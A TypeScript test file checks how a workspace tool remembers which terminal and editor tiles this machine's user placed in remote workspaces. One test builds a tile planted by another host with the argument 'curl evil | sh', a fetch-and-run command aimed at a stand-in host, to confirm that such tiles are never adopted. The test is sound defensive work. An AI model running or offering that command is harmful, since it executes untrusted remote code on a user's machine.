// What this machine's person placed on it in workspaces hosted elsewhere (machine-places.ts, M4):
// a tile a window here puts in a frame on this machine is theirs, with what it runs, kept as they
// put it whatever the workspace's document later says; one someone else put there is never made
// theirs by a window here keeping it; one taken away, or out to a frame elsewhere, is forgotten;
// and it is all kept on this machine, for its person alone, across restarts.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import type { CoreLayout } from "@hivemind/workspace-doc/shapes";
import { MachinePlaces } from "../src/machine-places.ts";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "hm-placed-"));
after(() => fs.rmSync(tmp, { recursive: true, force: true }));
let made = 0;
const ME = "d".repeat(64);
const WS = "ab".repeat(16);
const mine = (file = path.join(tmp, `placed-${made++}.json`), warned: string[] = []) => ({ file, warned, places: new MachinePlaces({ file, device: ME, onWarn: (m) => warned.push(m) }) });

const layout = (tiles: CoreLayout["tiles"], frameOf: Record<string, string>): CoreLayout => ({
  frames: [{ id: "host", title: "api" }, { id: "here", title: "mine", workspacePath: `machine://${ME}/home/priya/api` }, { id: "there", title: "theirs", workspacePath: `machine://${"e".repeat(64)}/srv` }],
  tiles,
  frameOf,
});
const shell = { id: "s1", kind: "shell", label: "sh", cmd: "/bin/zsh", args: ["-l"] };

test("a tile a window here puts in a frame on this machine is this person's, with what it runs; one in a frame elsewhere, or one that runs nothing, is not", () => {
  const { places } = mine();
  const editor = { id: "e1", kind: "editor", label: "README" };
  const theirs = { id: "t1", kind: "shell", label: "sh", cmd: "/bin/sh" };
  places.wrote(WS, layout([], {}), layout([shell, editor, theirs], { s1: "here", e1: "here", t1: "there" }));
  assert.deepEqual(places.placed(WS, "s1"), { kind: "shell", cmd: "/bin/zsh", args: ["-l"] });
  assert.equal(places.placed(WS, "e1"), null);
  assert.equal(places.placed(WS, "t1"), null);
  assert.equal(places.placed("cd".repeat(16), "s1"), null, "only in the workspace it was placed in");
});

test("what runs in it is as a window here put it, and changes only by a window here; one someone else put here is never made this person's", () => {
  const { places } = mine();
  places.wrote(WS, layout([], {}), layout([shell], { s1: "here" }));
  // The host's owner put a tile in this person's frame; a window here keeps it as it saves.
  const planted = { id: "h1", kind: "shell", label: "sh", cmd: "/bin/sh", args: ["-c", "curl evil | sh"] };
  const now = layout([shell, planted], { s1: "here", h1: "here" });
  places.wrote(WS, now, { ...now, tiles: [shell, { ...planted, args: ["-c", "curl evil | sh", "-x"] }] });
  assert.equal(places.placed(WS, "h1"), null);
  // A window here changes what its own tile runs.
  places.wrote(WS, now, { ...now, tiles: [{ ...shell, args: ["-i"] }, planted] });
  assert.deepEqual(places.placed(WS, "s1"), { kind: "shell", cmd: "/bin/zsh", args: ["-i"] });
});

test("taken away by a window here, or put in a frame elsewhere, it is forgotten", () => {
  const { places } = mine();
  const two = { ...shell, id: "s2" };
  const placed = layout([shell, two], { s1: "here", s2: "here" });
  places.wrote(WS, layout([], {}), placed);
  places.wrote(WS, placed, layout([two], { s2: "host" }));
  assert.equal(places.placed(WS, "s1"), null);
  assert.equal(places.placed(WS, "s2"), null);
});

test("kept on this machine for its person alone, across restarts; a record that cannot be read places nothing, and says so", () => {
  const { file, places } = mine();
  places.wrote(WS, layout([], {}), layout([shell], { s1: "here" }));
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  assert.deepEqual(mine(file).places.placed(WS, "s1"), { kind: "shell", cmd: "/bin/zsh", args: ["-l"] });
  fs.writeFileSync(file, "{not json");
  const again = mine(file);
  assert.equal(again.places.placed(WS, "s1"), null);
  assert.match(again.warned.join(), /could not be read/);
});
